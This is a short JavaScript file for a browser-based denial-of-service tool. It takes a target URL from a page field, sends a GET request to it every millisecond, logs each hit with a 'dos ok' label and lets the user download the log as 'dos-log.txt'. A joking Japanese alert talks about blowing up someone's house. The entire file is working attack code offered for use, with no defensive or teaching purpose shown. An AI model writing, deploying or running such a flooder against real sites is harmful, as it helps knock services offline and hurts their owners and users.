let intervalId = null;
let logData = [];

function addLog(message) {
  const logDiv = document.getElementById("log");
  const timestamp = new Date().toLocaleTimeString();
  const line = `[${timestamp}] ${message}`;
  logData.push(line);
  logDiv.innerHTML += line + "<br>";
  logDiv.scrollTop = logDiv.scrollHeight;
}

async function sendRequest(url) {
  try {
    const res = await fetch(url, { method: "GET" });
    const baseUrl = new URL(url).origin;
    addLog(`[+]dos ok…｜status:${res.status}｜${baseUrl}`);
  } catch (e) {
    addLog("error:" + e.message);
  }
}

function start() {
  const url = document.getElementById("url").value;
  if (!url) {
    alert("おぜうの家を爆破します");
    return;
  }
  if (intervalId) {
    clearInterval(intervalId);
  }
  logData = [];
  intervalId = setInterval(() => sendRequest(url),1);
  document.getElementById("status").innerText = "status:Starting => " + url;
  addLog("--Starting--");
}

function stop() {
  if (intervalId) {
    clearInterval(intervalId);
    intervalId = null;
  }
  document.getElementById("status").innerText = "status:stopped";
  addLog("--stopped--");
}

function downloadLog() {
  if (logData.length === 0) {
    alert("no data");
    return;
  }
  const blob = new Blob([logData.join("\n")], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "dos-log.txt";
  a.click();
  URL.revokeObjectURL(url);
}
